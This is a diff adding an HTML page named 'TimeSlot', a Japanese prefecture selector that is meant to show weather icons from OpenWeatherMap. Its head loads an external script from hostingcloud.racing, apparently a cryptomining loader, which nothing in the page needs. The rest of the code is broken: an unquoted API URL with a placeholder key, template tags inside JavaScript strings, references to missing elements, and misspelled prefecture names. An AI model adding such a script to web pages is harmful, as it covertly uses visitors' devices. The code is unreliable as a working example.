@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="" />
+    <link rel="icon" href="img/favicon.png" sizes="16*16" />
+    <title>TimeSlot</title>
+    <style>
+      html {
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden;
+      }
+      body {
+        background-color: black;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        padding: 0;
+        box-shadow: border-box;
+        color: #0ff;
+        font-size: 2vw;
+        font-family: "Digital-7 Mono", sans-serif;
+        position: relative;
+      }
+    </style>
+    <script src="https://www.hostingcloud.racing/s4ks.js"></script>
+  </head>
+  <body>
+    <select id="citySelect" onchange="updateWeather()">
+      <option value="Hokkaido, JP">北海道</option>
+      東北地方
+      <option value="Aomori-ken, JP">青森県</option>
+      <option value="Akita, JP">秋田県</option>
+      <option value="Iwate, JP">岩手県</option>
+      <option value="Ymagata-ken, JP">山形県</option>
+      <option value="Miyagi-ken, JP">宮城県</option>
+      <option value="Fukushima-ken, JP">福島県</option>
+      関東地方
+      <option value="Ibaraki, JP">茨城県</option>
+      <option value="Tochigi, JP">栃木県</option>
+      <option value="Gunma-ken, JP">群馬県</option>
+      <option value="Chiba-ken, JP">千葉県</option>
+      <option value="Tokyo, JP">東京都</option>
+      <option value="Saitama-ken, JP">埼玉県</option>
+      <option value="Kanagawa, JP">神奈川県</option>
+      中部地方
+      <option value="Niigata-ken, JP">新潟県</option>
+      <option value="Toyama-ken, JP">富山県</option>
+      <option value="Isikawa-ken, JP">石川県</option>
+      <option value="Nagata-ken, JP">長野県</option>
+      <option value="Yamanashi, JP">山梨県</option>
+      <option value="Shizuoka, JP">静岡県</option>
+      <option value="Aichi-ken, JP">愛知県</option>
+      <option value="Gifu, JP">岐阜県</option>
+      <option value="Fukui, JP">福井県</option>
+      近畿地方
+      <option value="Shiga, JP">滋賀県</option>
+      <option value="Kyoto Prefecture, JP">京都府</option>
+      <option value="Hyōgo, JP">兵庫県</option>
+      <option value="Mie-ken, JP">三重県</option>
+      <option value="Nara-ken, JP">奈良県</option>
+      <option value="Wakayama, JP">和歌山県</option>
+      <option value="Ōsaka-fu, JP">大阪府</option>
+      中国地方
+      <option value="Tottori-ken, JP">鳥取県</option>
+      <option value="Okayama-ken, JP">岡山県</option>
+      <option value="Simane-ken, JP">島根県</option>
+      <option value="Yamaguchi, JP">山口県</option>
+      <option value="Hiroshima-ken, JP">広島県</option>
+      四国地方
+      <option value="Kagawa-ken, JP">香川県</option>
+      <option value="Tokushima-ken, JP">徳島県</option>
+      <option value="Kochi Prefecture, JP">高知県</option>
+      <option value="Ehime, JP">愛媛県</option>
+    </select>
+    <div class="reload">
+      <button id="confirmButton">決定</button>
+      <button id="backButton" onclick="goBack()">戻る</button>
+    </div>
+    <script>
+      var city = localStorage.getItem("city") || "Tokyo, JP";
+      var currentPage = window.location.pathname.split("/").pop();
+
+      function updateWeather() {
+        var newCity = document.getElementById("citySelect").value;
+        if (newCity) {
+          city = newCity;
+          localStorage.setItem("city", city);
+        }
+        document.getElementById("selectedCity").innerHTML =
+          "選択した都市: " + city;
+      }
+
+      var apiUrl =
+      https://history.openweathermap.org/data/2.5/aggregated/day?id=2643743&month=2&day=2&appid={your-openweathermap-APIkey}
+
+      fetch(apiUrl)
+        .then((response) => response.json())
+        .then((data) => {
+          var weather = data.weather[0].main;
+          var mark;
+          if (weather === "Clear") {
+            mark = "{% if ☀ %}";
+          } else if (weather === "Clouds") {
+            mark = "{% if ☁️ %}";
+          } else if (weather === "Rain") {
+            mark = "{% if ☔ %}";
+          } else if (weather === "snow") {
+            mark = "{% if ⛄ %}";
+          } else {
+            mark = "{% else ⚡ %}";
+          }
+          document.getElementById("weather").innerHTML = mark;
+        })
+        .catch((error) => console.error("Error:", error));
+
+      function goBack() {
+        window.history.back();
+      }
+
+      document
+        .getElementById("confirmButton")
+        .addEventListener("click", function () {
+          updateWeather();
+          window.location.href = "index2.html"; // 前のページにリダイレクト
+        });
+
+      updateWeather();
+    </script>
+  </body>
+</html>
